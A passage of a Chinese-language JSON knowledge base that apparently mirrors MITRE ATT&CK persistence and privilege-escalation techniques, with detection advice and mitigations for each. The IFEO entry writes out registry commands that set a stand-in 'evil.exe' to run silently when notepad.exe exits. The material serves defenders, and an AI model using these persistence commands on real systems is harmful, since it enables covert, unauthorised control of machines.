	"description": "<p>具有足够访问级别权限的攻击者可以创建本地系统或域账号。此类账号可用于持久性，不需要在系统上部署持久性远程访问工具。</p><p>在云环境中，攻击者可能会创建仅用于访问特定服务的账户，从而减少被检测到的可能。</p><p>Windows</p><p>可使用net user命令来创建本地或域账号。</p><p>Office 365</p><p>有权访问全局管理员账户的攻击者可以创建其他账户，并为其分配全局管理员角色以便能持久访问Office 365租户。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows", "AWS", "GCP", "Azure AD", "Azure", "Office 365"],
		"permissionRequired": ["管理员"],
		"dataSources": ["Office 365账户日志", "Azure活动日志", "AWS CloudTrail日志", "进程监控", "进程命令行参数", "认证日志", "Windows事件日志"]
	},
	"relations": {
		"detection": "<p>收集网络内账号创建相关数据。在Windows系统和域控制器上创建用户账号时生成事件4720。定期审核域和本地系统账号啦查看是否有攻击者创建了可疑账号。</p><p>收集云管理员账户使用日志，查看创建新账户并为这些账户分配角色时的异常活动。监控分配给管理员角色的账户是否超过已知管理员的特定阈值。</p>",
		"mitigations": [{
			"name": "多因子认证",
			"description": "对用户和特权账号使用多因子认证。"
		}, {
			"name": "网络分区",
			"description": "配置访问控制和防火墙来限制访问用于创建和管理账号的域控制器和系统。"
		}, {
			"name": "操作系统配置",
			"description": "通过确保关键服务器的适当安全配置来保护域控制器。"
		}, {
			"name": "特权账号管理",
			"description": "不允许将域管理员账号用于日常操作因为这些操作可能会将域管理员账号暴露给非特权系统上的潜在攻击者。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "创建账号"
}, {
	"id": "T1038",
	"description": "<p>Windows系统使用常用方法来查找加载到程序中的必要的动态链接库。攻击者可能会利用Windows动态链接库搜索顺序以及模糊指定动态链接库的程序来获得权限提升和持久性。</p><p>攻击者可能会通过在Windows的合法动态链接库之前的搜索位置放置与模糊指定的动态链接库同名的恶意动态链接库来实现预加载，也称为二进制植入攻击。通常，此位置是程序的当前工作目录。当程序在加载动态链接库之前将其当前目录设置为远程位置（如web共享）时，会发生远程动态链接库预加载攻击。攻击者的此行为会导致程序加载恶意动态链接库。</p><p>攻击者还可能会通过替换现有动态链接库或修改.manifest或.local重定向文件、目录或联结来直接修改程序加载动态链接库的方式，使得程序加载不同的动态链接库来维持持久性或获得权限提升。</p><p>如果搜索顺序易受攻击的程序配置为需更高权限级别运行，则加载的攻击者控制的动态链接库也将以更高级别执行。在这种情况下，该技术可用于从用户到管理员/系统或从管理员到系统的权限提升，具体取决于程序。</p><p>受路径劫持影响的程序的行为可能看起来是正常的，因为恶意动态链接库可能配置为加载它们要替换的合法动态链接库。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员", "系统"],
		"dataSources": ["文件监控", "动态链接库监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>监控文件系统来查看是否有动态链接库移动，重命名，替换或修改行为。若进程加载的动态链接库集（与过去的行为相比）中的变化与已知软件、补丁等无关，则这些变化是可疑的。监控加载到进程中的动态链接库，并检测具有相同文件名但路径异常的动态链接库。修改或创建与软件更新无关的.manifest和.local重定向文件是可疑的。</p>",
		"mitigations": [{
			"name": "审核",
			"description": "使用审核工具来检测企业系统中动态链接库搜索顺序劫持情况并对检测到的情况进行纠正。像PowerSploit框架这样的工具包包含PowerUp模块，可用于探索系统中的动态链接库劫持漏洞。"
		}, {
			"name": "执行预防",
			"description": "攻击者可能会使用新的动态链接库来实施此技术。使用能够阻止合法软件加载动态链接库的应用白名单解决方案来识别并阻止通过搜索顺序劫持执行的潜在恶意软件。"
		}, {
			"name": "库加载限制",
			"description": "禁止加载远程动态链接库。默认情况下，这包含在Windows Server 2012+中，也可以在XP +和Server 2003+上打补丁来获得。启用Safe DLL Search Mode来强制在搜索本地目录（例如用户家目录）之前先搜索具有更大限制的目录（例如 %SYSTEMROOT%）。可以通过组策略在以下路径启用Safe DLL Search Mode：配置 > [策略] > 管理模板 > MSS（旧版）：MSS：（SafeDllSearchMode）Enable Safe DLL search mode。相关的Windows注册表项位于HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDLLSearchMode。"
		}],
		"tactics": ["TA0003", "TA0004", "TA0005"]
	},
	"name": "DLL搜索顺序劫持"
}, {
	"id": "T1157",
	"description": "<p>针对macOS和OS X操作系统，可以通过常规方式查找目标动态库，再根据获取的搜索路径将动态库加载到程序中。攻击者可能会利用二义性植入动态库，从而获取权限提升或持久性。</p><p>一种常见的方法是查看应用程序使用的动态库，然后在搜索路径的上一级目录安装同名的恶意代码。这通常会导致恶意代码与应用程序本身位于同一文件夹中。</p><p>如果程序配置为以比当前用户更高的权限级别运行，那么当动态库加载到应用程序中时，动态库也将在该高级别运行。攻击者可能会以此技术来提升权限。</p>",
	"details": {
		"platform": ["macOS"],
		"permissionRequired": ["用户"],
		"dataSources": ["文件监控"]
	},
	"relations": {
		"detection": "<p>可使用Objective-See动态库劫持扫描仪检测动态库劫持的潜在案例。监控文件系统中的动态库移动、重命名、替换或修改。如果与已知软件、补丁等不相关的进程加载的一系列动态库中发生更改（与过去的行为相比），则是可疑的。检查系统中是否有多个同名的动态库，以及监控加载到进程中的历史版本。</p>",
		"mitigations": [{
			"name": "文件和目录权限限制",
			"description": "在运行应用程序的文件夹和标准动态库文件夹中，设置目录访问控制以防止文件写入应用程序的搜索路径。"
		}, {
			"name": "用户账户管理",
			"description": "防止用户将文件写入应用程序的搜索路径。"
		}],
		"tactics": ["TA0003", "TA0004"]
	},
	"name": "Dylib劫持"
}, {
	"id": "T1519",
	"description": "<p>攻击者可能会使用事件监控程序（emond）通过调度恶意命令在预计的事件触发器上运行来建立持久性。Emond是一个启动守护程序，它接受来自各种服务的事件，通过简单的规则引擎来运行他们并采取行动。<code>/sbin/emond</code>路径下的emond二进制文件会从<code>/etc/emond.d/rules/</code>加载所有规则，并在发现明确定义的事件后立即采取行动。规则文件为plist格式并且定义了名称、事件类型和要执行的操作。例如，事件类型包括系统启动和用户身份认证事件；要执行的操作包括运行系统命令和发送邮件。如果启动守护程序配置文件<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>中指定的QueueDirectories路径<code>/private/var/db/emondClients</code>下没有文件，则不会启动emond服务。</p><p>攻击者可能会通过编写规则在发生定义的事件（系统启动或用户身份认证事件）时执行命令。如果启动守护程序以root权限执行emond服务，攻击者还可能将权限从管理员级别提升到root用户级别。</p>",
	"details": {
		"platform": ["macOS"],
		"permissionRequired": ["管理员"],
		"dataSources": ["文件监控", "API 监控"]
	},
	"relations": {
		"detection": "<p>通过检查<code>/etc/emond.d/rules/</code>及<code>/private/var/db/emondClients</code>路径下生成或修改的文件来监控是否创建了emond规则。</p>",
		"mitigations": [{
			"name": "特性/程序禁用或删除",
			"description": "请考虑通过删除启动守护程序的plist文件来禁用emond服务。"
		}],
		"tactics": ["TA0003", "TA0004"]
	},
	"name": "Emond"
}, {
	"id": "T1044",
	"description": "<p>进程可能会自动执行其功能涉及到的特定二进制文件或执行其他操作。如果包含目标二进制文件的文件系统目录的权限或二进制文件本身的权限设置不正确，则目标二进制文件可能会被另一个使用用户级权限的二进制文件覆盖并由原始进程执行。如果原始进程和线程在更高的权限级别下运行，则替换的二进制文件也将在更高级别的权限下执行，这可能包括系统权限。</p><p>攻击者可能会使用此技术将合法二进制文件替换为恶意二进制文件，使用此手段在更高权限级别执行代码。如果配置执行进程在特定时间或在某个特定事件（例如，系统启动）期间运行，则该技术也可以用于获得持久性。</p><p>服务</p><p>操纵Windows服务二进制文件是此技术的一种变体。攻击者可能会用自己的可执行文件替换合法的服务可执行文件，以获得持久性和/或将权限升级到服务执行账号级别（本地/域账号，SYSTEM，LocalService或NetworkService）。一旦服务启动，不管它是直接由用户启动（如果有适当访问权限）还是通过某些其他方式来启动（例如随系统重启而启动），则运行替换的可执行文件，而不是原始服务可执行文件。</p><p>可执行安装程序</p><p>此技术的另一个变体是利用可执行的自解压安装程序的常见缺陷。在安装过程中，安装程序通常使用<code>%TEMP%</code>目录中的子目录来解压缩二进制文件，例如动态链接库，EXE或其他有效负载。安装程序在创建子目录和文件时，通常不会设置适当的权限来限制写访问，这就会允许执行子目录中的非信任代码或覆盖安装过程中使用的二进制文件。此行为与动态链接库搜索顺序劫持有关，并可能利用此劫持技术。某些安装程序可能还需要提升权限，这将导致在执行攻击者控制的代码时提升权限。此行为与绕过用户账号控制有关。已向软件供应商报告了现有通用安装程序中存在这种缺陷的几个例子。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "用户"],
		"dataSources": ["文件监控", "服务", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>查找通常在软件更新期间可能发生的二进制文件和服务可执行文件的更改。编写、重命名和/或移动可执行文件来匹配现有服务可执行文件的行为会被检测到并与其他可疑行为相关联。二进制文件和服务可执行文件的哈希可以用来检测历史数据的替换。</p><p>从典型进程和服务中查找异常进程调用树，并查看是否有与发现操作或其他攻击技术相关的其他命令的执行。</p>",
		"mitigations": [{
			"name": "审核",
			"description": "使用审核工具来检测企业系统中文件系统权限滥用情况并对检测到的情况进行纠正。像PowerSploit框架这样的工具包包含PowerUp模块，可用于探索系统中的服务文件系统权限缺陷。"
		}, {
			"name": "用户账号控制",
			"description": "添加以下内容来关闭标准用户[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]的UAC权限提升功能、自动拒绝提升请求：\"ConsentPromptBehaviorUser\"=dword:00000000。考虑添加以下内容为所有用户启用安装程序检测功能：\"EnableInstallerDetection\"=dword:00000001。此功能启用后，会提示输入安装密码并记录尝试日志。如需禁用安装程序检测，请添加以下内容：\"EnableInstallerDetection\"=dword:00000000。这可能会防止攻击者在UAC检测安装程序时利用漏洞来提升权限，但是允许继续安装过程而且不记录日志。"
		}, {
			"name": "用户账号管理",
			"description": "限制用户账号和组的权限，使得只有授权管理员才能与服务更改和服务二进制目标路径位置进行交互。拒绝从用户目录执行，例如文件下载目录和临时目录。"
		}],
		"tactics": ["TA0003", "TA0004"]
	},
	"name": "文件系统权限缺陷"
}, {
	"id": "T1158",
	"description": "<p>为了防止普通用户意外更改系统上的特殊文件，大多数操作系统都有“隐藏文件”的概念。当用户使用GUI浏览文件系统或在命令行上使用普通命令时，这些文件不会显示。用户必须通过一系列GUI提示或命令行开关（Windows的dir /a，Linux和macOS的ls –a）明确要求才能显示隐藏的文件。</p><p>攻击者可能会利用这一点，将文件和文件夹隐藏在系统上的任何位置，从而获得持久性并规避不包含隐藏文件调查的典型用户或系统分析。</p><p>Windows</p><p>用户可以使用attrib.exe二进制文件将特定文件标记为隐藏。他们只需使用 <code>attrib +h filename</code> 就可将文件或文件夹标记为隐藏。类似地，可以使用“+ s”将文件标记为系统文件，使用“+ r”将文件标记为只读。与大多数Windows二进制文件一样，attrib.exe二进制文件提供了以递归方式（/ S）应用这些更改的能力。</p><p>Linux/Mac</p><p>用户只需输入“.”作为文件名或文件夹名的第一个字符，就可以将特定文件标记为隐藏。默认情况下，以句点“.”开头的文件和文件夹在Finder应用和标准命令行实用程序（如“ls”）中不显示。用户必须专门更改设置才能查看这些文件。对于使用命令行的情况，通常可用一个标志来查看所有文件（包括隐藏的文件）。要在Finder应用中查看这些文件，必须执行<code>defaults write com.apple.finder AppleShowAllFiles YES</code>命令并重新启动Finder应用。</p><p>Mac</p><p>MacOS上的文件如果带uf_hidden标记，那么在finder.app中看不到文件，但在terminal.app中仍可以看到。许多应用程序使用隐藏文件和文件夹来存储信息，这样就不会使用户的工作区变得杂乱无章。例如，SSH实用程序创建一个隐藏的.ssh文件夹，用于存储用户的已知主机和密钥信息。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>监控文件系统和shell命令来查看是否有正在创建的文件名以“.”字符开头，以及是否有通过Windows命令行使用attrib.exe添加隐藏属性的情况。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005", "TA0003"]
	},
	"name": "隐藏文件和目录"
}, {
	"id": "T1179",
	"description": "<p>Windows进程通常利用应用程序编程接口（API）函数来执行需要可重用系统资源的任务。Windows API函数通常作为导出函数存储在动态链接库（DLLs）中。</p><p>Hooking包括将调用重定向到这些函数。可以通过以下方式实现：</p><p>·                  Hook程序，它拦截并执行指定的代码以响应消息、按键和鼠标输入等事件。</p><p>·                  导入地址表（IAT）hooking，它使用对进程IAT的修改，其中存储了导入API函数的指针。</p><p>·                  内联hooking，它重写API函数中的第一个字节以重定向码流。</p><p>与进程注入类似，攻击者可以使用hooking技术在另一个进程的上下文中加载和执行恶意代码，屏蔽执行，同时还允许访问进程的内存，以及可能提升权限。函数正常调用时，安装hooking机制还可以利用连续调用来提供持久性。</p><p>恶意hooking机制还可能捕获API调用，这些调用包含用户验证凭据访问的参数。</p><p>Rootkits通常使用hooking技术来隐藏文件、进程、注册表项和其他对象，从而隐藏恶意软件及其相关行为。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["API监控", "二进制文件元数据", "动态链接库监控", "加载的动态链接库", "进程监控", "Windows事件日志"]
	},
	"relations": {
		"detection": "<p>监控对hook函数SetWindowsHookEx和SetWinEventHook的调用。还可以考虑使用工具或通过编程检查内核结构来分析hook链（为每种hook类型保存hook过程的指针）。</p><p>可使用Rootkits检测器来监测各种类型的hooking活动。通过比较内存中的代码与对应的静态二进制代码，尤其是检查跳转和重定向码流，来验证活动进程的完整性。还可以考虑制作新进程的快照，由此比对内存中的IAT和引用函数的实际地址。</p><p>同时，分析进程行为，确定进程是否正在执行异于常规的操作，例如打开网络连接、读取文件以及与攻击后行为相关的可疑操作。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0003", "TA0004", "TA0006"]
	},
	"name": "Hook"
}, {
	"id": "T1062",
	"description": "<p>Type-1虚拟机管理程序是介于客户操作系统和系统硬件之间的软件层，它为操作系统提供了一个虚拟环境。Xen是常见的虚拟机管理程序。Type-1虚拟机管理程序的运行级别低于操作系统，并且可以设计为具有Rootkit功能，以将其隐匿在客户操作系统中。通过中断，这种性质的恶意管理程序会持续存在于系统中。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["系统调用"]
	},
	"relations": {
		"detection": "<p>可以通过执行时序分析来检测Type-1虚拟机管理程序。虚拟机管理程序可以模拟某些可以直接由硬件运行的CPU指令。如果执行某条指令所花费的时间比正常执行长几个数量级，则表示可能存在虚拟机管理程序。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "管理程序"
}, {
	"id": "T1183",
	"description": "<p>图像文件执行选项（IFEO）使开发人员可以将调试器附加到应用程序。进程创建时，应用程序图像文件执行选项中的调试器会被前置到程序名称之前，启动一个新调试器进程（比如，\"C:\\dbg\\ntsd.exe -g notepad.exe\"）。</p><p>可以在注册表直接设置图像文件执行选项或者通过GFlags工具在Global Flags中设置。图像文件执行选项在注册表位置<code>HKLM\\SOFTWARE{{\\Wow6432Node}}\\Microsoft\\WindowsNT\\CurrentVersion\\ImageFile Execution Options\\</code>下表示为<code>Debugger</code>参数值，对应连接调试器的二进制文件。</p><p>当特定的程序静默退出时（比如，当被自身或者另一个非内核级进程永久终止时），图像文件执行选项也能够启动任意监控程序。与调试器类似，可以通过GFlags工具开启静默退出监控或者在<code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\SilentProcessExit\\</code>下直接修改图像文件执行选项和静默进程退出相关的注册表项值。</p><p>比如：当notepad.exe退出时，evil.exe进程会启动：</p><p><code>·         </code><code>reg add\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File ExecutionOptions\\notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512</code></p><p><code>·         </code><code>reg add\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\"/v ReportingMode /t REG_DWORD /d 1</code></p><p>·         <code>reg add \"HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v MonitorProcess /d\"C:\\temp\\evil.exe\"</code></p><p>与进程注入类似，这些值可能会被滥用以获得持久性和权限提升，因为它们会导致在计算机上不同进程的上下文中加载和运行恶意可执行文件。安装图像文件执行选项的方法还可以通过连续调用来提供持久性。</p><p>恶意软件还可能会通过注册无效的调试器来利用图像文件执行选项进行防御逃逸，这些调试器会转向并有效地禁用各种系统和安全应用程序。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["进程监控", "Windows注册表", "Windows事件日志"]
	},
	"relations": {
		"detection": "<p>监控在异常父进程下创建的正常进程，或者带有调试进程创建标识的进程，比如<code>DEBUG_PROCESS</code> 和<code>DEBUG_ONLY_THIS_PROCESS</code>。</p><p>监控与安装图像文件执行选项有关联的注册表值以及进程静默退出，查看与已知软件、补丁程序等不相关的修改。监控和分析与注册表编辑有关的应用程序编程接口（API）调用，比如regcreatekeyex和regsetvalueex。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0004", "TA0003", "TA0005"]
	},
	"name": "图像文件执行选项注入"
}, {
	"id": "T1525",
	"description": "<p>亚马逊web服务（AWS）亚马逊机器镜像（AMI），Google云平台（GCP）镜像，Azure镜像以及流行的容器运行时（比如Docker）可能被植入恶意代码或以创建后门的形式加入恶意代码。如果基础设施配置工具按要求须使用最新镜像，攻击者可能以此方式获得持久访问，具体取决于基础设施的配置方式。</p><p>已经有攻击者开发了一个工具来协助其在云容器镜像中放置后门。如果攻击者有权访问入侵的AWS实例并有权列出可用容器镜像，他们可能会植入后门，比如web shell。攻击者还可能会植入Docker镜像以便悄无声息地用于云部署，这在某些加密挖矿僵尸网络实例中已有报道。</p>",
	"details": {
		"platform": ["GCP", "Azure", "AWS"],
		"permissionRequired": ["用户"]
	},
	"relations": {
		"detection": "<p>监控用户与镜像及容器的交互，识别异常添加或修改的镜像和容器。</p>",
		"mitigations": [{
			"name": "审核",
			"description": "定期检查云部署中使用的镜像及容器的完整性，确保它们未被修改、未被植入恶意软件。"
		}, {
			"name": "代码签名",
			"description": "某些云服务提供商支持内容信任模型，这些模型要求容器镜像由受信任的源签名。"
		}, {
			"name": "特权账户管理",
			"description": "根据最小权限原则，限制与创建和修改平台镜像或容器相关的权限。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "植入容器镜像"
}, {
	"id": "T1215",
	"description": "<p>可加载内核模块（LKM）是可以根据需要加载到和从内核卸载的代码片段。它们扩展了内核功能，而无需重启系统。例如，设备驱动程序是一种可加载内核模块，它允许内核访问系统连接的硬件。如果被恶意使用，LKM可以是一种以最高操作系统特权（Ring 0）运行的内核模式Rootkit。攻击者可能会使用LKM隐藏在系统上并逃避防御。已知一些在野案例及开源项目。</p><p>基于LKM的rootkit的常见功能包括：隐藏自身，选择性隐藏文件，进程和网络活动，以及日志篡改，提供经过身份验证的后门以及对非特权用户启用root权限访问。</p><p>内核扩展（也称为kext）用于macOS，将功能加载到类似于Linux LKM的系统上。内核扩展通过kextload和kextunload命令加载和卸载。已知几个使用内核扩展的例子。</p>",
	"details": {
		"platform": ["Linux", "macOS"],
		"permissionRequired": ["root用户"],
		"dataSources": ["系统调用", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>LKM通常加载到/lib/modules中，并且自Linux内核版本2.6起具有扩展名.ko（“内核对象”）。</p><p>许多LKM需要Linux头文件（特定于目标内核）才能正确编译。这些通常是通过操作系统包管理器获得，并像普通包一样安装。</p><p>攻击者可能会在加载恶意模块之前在目标系统上运行这些命令，以确保文件可被正确编译。</p><p>在基于Ubuntu和Debian的系统上可以通过运行以下命令来完成：<code>apt-get install linux-headers-$(uname -r)</code></p><p>在基于RHEL和CentOS的系统上可以通过运行以下命令来完成：<code>yum install kernel-devel-$(uname -r)</code></p><p>可以通过监控以下命令的执行来检测Linux系统上的模块加载，卸载和操控：<code>modprobe insmod lsmod rmmod modinfo</code></p><p>对于macOS，监控kextload命令的执行并与其他未知或可疑活动相关联。</p>",
		"mitigations": [{
			"name": "杀毒软件",
			"description": "可使用rkhunter或chrootkit工具检测Linux rootkit，尽管rootkit可能被设计为逃避某些检测工具。"
		}, {
			"name": "执行预防",
			"description": "也可使用应用程序白名单和软件限制工具（如SELinux）来限制内核模块加载。"
		}, {
			"name": "特权账户管理",
			"description": "限制对root帐户的访问，并通过适当的权限分离和限制提升权限的机会来阻止用户加载内核模块和扩展。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "内核模块和扩展"
}, {
	"id": "T1159",
	"description": "<p>根据Apple的开发人员文档，用户登录时会启动一个按用户启动的进程。此进程从<code>/System/Library/LaunchAgent</code>、<code>/Library/LaunchAgents</code>和<code>$HOME/Library/LaunchAgents</code>路径下找到属性列表（plist）文件，并为每个按需启动的用户代理加载plist文件中的参数。这些启动代理具有指向待启动可执行文件的属性列表文件。</p><p>攻击者可能会安装一个新的启动代理，并通过launchd或launchctl将plist加载到适当的目录中来配置启动代理为在登录时执行。代理的名称可以伪装为相关操作系统或良性软件的名称。启动代理是使用用户级权限创建的，并在用户登录时使用用户权限执行。启动代理可以设置为在特定用户登录（在特定用户的目录结构中）或任何用户登录（需要管理员权限）时执行。</p>",
	"details": {
		"platform": ["macOS"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["文件监控", "进程监控"]
	},
	"relations": {
		"detection": "<p>通过其他plist文件和实用程序（如Objective-see的KnockKnock程序）来监控启动代理的创建。也可以通过其他文件监控程序来监控启动代理是否使用了磁盘上的文件来获得持久性。</p>",
		"mitigations": [{
			"name": "用户账户管理",
			"description": "限制用户使用组策略创建启动代理的能力。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "启动代理"
}, {
	"id": "T1160",
	"description": "<p>根据Apple的开发人员文档，macOS和OS X启动时会运行launchd来完成系统初始化。此进程从<code>/System/Library/LaunchDaemons</code>和<code>/Library/LaunchDaemons</code>路径下找到属性列表（plist）文件，并为每个按需启动的系统级守护程序加载plist文件中的参数。这些启动守护程序具有指向待启动可执行文件的属性列表文件。</p><p>攻击者可能会安装一个新的启动守护进程，并通过launchd或launchctl将plist加载到适当的目录中来配置启动守护程序为在启动时执行。守护进程的名称可以伪装为相关操作系统或良性软件的名称。启动守护程序可能是使用管理员权限创建的，但在root用户权限下执行。因此攻击者也可能会使用服务将权限从管理员升级到root用户。</p><p>plist文件的权限必须是root:wheel，但是它指向的脚本或程序没有这样的要求。因此，如果配置不正确，攻击者就有可能会修改当前启动守护程序的可执行文件并获得持久性或权限升级。</p>",
	"details": {
		"platform": ["macOS"],
		"permissionRequired": ["管理员"],
		"dataSources": ["进程监控", "文件监控"]
	},
	"relations": {
		"detection": "<p>通过其他plist文件和实用程序（如Objective-see的Knock Knock程序）来监控启动守护程序的创建。</p>",
		"mitigations": [{
			"name": "用户账号管理",
			"description": "限制用户帐户权限并修复权限升级矢量，只允许授权的管理员创建新的启动守护程序。"
		}],
		"tactics": ["TA0003", "TA0004"]
	},
	"name": "启动守护进程"
}, {
	"id": "T1161",
	"description": "<p>Mach-O二进制文件有一系列文件头，用于在加载二进制文件时执行某些操作。Mach-O二进制文件头LC_LOAD_DYLIB告诉macOS和OS X在执行期间加载哪些动态库。只要对其余字段和依赖项进行调整，就可以将它们临时添加到已编译的二进制文件中。有可用于执行这些更改的工具。任何更改都将使二进制文件上的数字签名无效，因为二进制文件正在被修改。攻击者只需从二进制文件中删除LC_CODE_SIGNATURE命令，就可以逃避加载时的签名检查。</p>",
	"details": {
		"platform": ["macOS"],
		"permissionRequired": ["用户"],
		"dataSources": ["二进制文件元数据", "进程监控", "进程命令行参数", "文件监控"]
	},
	"relations": {
		"detection": "<p>监控可用于修改二进制文件头的进程。监控文件系统中的应用程序二进制文件更改以及无效校验和及签名。与应用程序更新或补丁不匹配的二进制文件更改也非常可疑。</p>",
		"mitigations": [{
			"name": "审核",
			"description": "可以根据二进制文件所需的动态库建立基线。如果应用程序需要新动态库且此动态库未包含在更新中，则应对此进行调查。"
		}, {
			"name": "代码签名",
			"description": "强制所有二进制文件都由正确的Apple开发人员ID签名。"
		}, {
			"name": "执行预防",
			"description": "通过已知哈希将应用程序列入白名单。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "LC_LOAD_DYLIB添加"
}, {
	"id": "T1162",
	"description": "<p>MacOS提供了列出用户登录时要运行的特定应用程序的选项。这些应用程序在登录用户的上下文中运行，并且将在每次用户登录时启动。使用服务管理框架安装的登录项在系统首选项中不可见，并且只能由创建它们的应用程序删除。用户可以直接控制使用共享文件列表安装的登录项目，该文件列表在系统首选项中也可见。这些登录项存储在用户路径<code>~/Library/Preferences/</code>下的<code>com.apple.loginitems.plist</code>文件中。其中一些应用程序可以向用户打开可见对话框，但不必都打开，因为有\"隐藏\"窗口的选项。如果攻击者可以注册自己的登录项或修改现有登录项，则每次用户登录时，他们都可能会以此来执行他们的代码以获得持久性。API方法<code>SMLoginItemSetEnabled</code>可用于设置登录项，但脚本语言（如AppleScript）也可以执行此操作。</p>",
	"details": {
		"platform": ["macOS"],
		"permissionRequired": ["用户"],
		"dataSources": ["文件监控", "API监控"]
	},
	"relations": {
		"detection": "<p>可通过访问Apple菜单 &gt; 系统首选项 &gt; 用户和组 &gt;登录项来查看共享文件列表创建的所有登录项目。对于已知的良好应用程序，应监控此区域（及相应的文件位置）并列入白名单。否则，登录项位于应用程序包中的<code>Contents/Library/LoginItems</code>路径下，因此也应监控这些路径。监控由登录操作导致的异常或未知应用程序的流程执行。</p>",
		"mitigations": [{
			"name": "用户帐户管理",
			"description": "限制用户创建自己的登录项。"
		}, {
			"name": "用户培训",
			"description": "登录时按住Shift键可防止应用自动打开。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "登录项"
}, {
	"id": "T1037",
	"description": "<p>Windows允许在特定用户或用户组登录系统时运行登录脚本。脚本可用于执行管理功能，这些功能通常可以执行其他程序或向内部日志服务器发送信息。</p><p>如果攻击者可以访问这些登录脚本，他们可能会在脚本中插入其他代码，以便在用户登录时执行他们的工具。如果使用的是本地脚本，通过插入代码他们可以在单个系统上保持持久性；如果脚本存储在中央服务器上并推送到多个系统，通过插入代码他们可以在网络中横向移动。根据登录脚本的访问配置，操作中可能需要本地凭据或管理员账号。</p><p>只要特定用户登录或退出系统，Mac就允许以root用户运行登录和注销Hook。用户登录时，登录Hook告诉Mac OS X执行某个脚本。但与启动项不同的是，登录Hook以root用户执行。一次只能有一个登录Hook。如果攻击者可以访问这些脚本，他们可以在脚本中插入其他代码，以便在用户登录时执行他们的工具。</p>",
	"details": {
		"platform": ["macOS", "Windows"],
		"dataSources": ["文件监控", "进程监控"]
	},
	"relations": {
		"detection": "<p>监控登录脚本来查看是否有异常用户的访问或异常时间的访问。查找由正常管理职责之外的异常账号添加或修改的文件。</p>",
		"mitigations": [{
			"name": "文件和目录权限限制",
			"description": "将登录脚本的写访问权限限制为特定管理员。"
		}],
		"tactics": ["TA0008", "TA0003"]
	},
	"name": "登录脚本"
}, {
	"id": "T1031",
	"description": "<p>Windows服务配置信息（包括服务可执行文件或恢复程序/命令的文件路径）存储在注册表中。可以使用sc.exe和Reg等实用程序修改服务配置。</p><p>攻击者可能会使用系统实用程序或自定义工具与Windows API交互来修改现有服务以便在系统上保留恶意软件。使用现有服务是一种伪装形式，可能会使检测分析更具挑战性。修改现有服务可能会中断其功能，或者可能启用已禁用或不常用的服务。</p><p>攻击者还可能故意破坏或终止服务，从而执行恶意恢复程序/命令。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["Windows注册表", "文件监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>查找与已知软件、补丁周期等无关的服务注册表项更改。把二进制路径和服务启动类型从手动或禁用更改为自动（如果通常不这样做）的行为是可疑的。也可使用Sysinternals Autoruns等工具来检测是否有旨在获得持久性的系统服务更改。</p><p>服务信息存储在<code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>的注册表中。</p><p>能够通过命令行调用修改服务的工具可能不常见，具体取决于系统在特定环境中的使用方式。收集服务实用程序执行信息和服务二进制路径参数，用于分析。甚至可以更改服务二进制路径以执行命令或脚本。</p><p>从已知服务中查找异常进程调用树来查看是否有与发现操作或其他攻击技术相关的其他命令的执行。还可以通过Windows系统管理工具（如Windows Management Instrumentation和PowerShell）来修改服务。如果通过此方式修改服务，可能还需要配置日志功能以收集适当数据。</p>",
		"mitigations": [{
			"name": "审核",
			"description": "使用审核工具来检测企业系统中权限和服务滥用情况并对检测到的情况进行纠正。"
		}, {
			"name": "用户账号管理",
			"description": "限制用户账号和组的权限，以便只有授权管理员才能与服务更改和服务配置进行交互。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "修改现有服务"
}, {
	"id": "T1128",
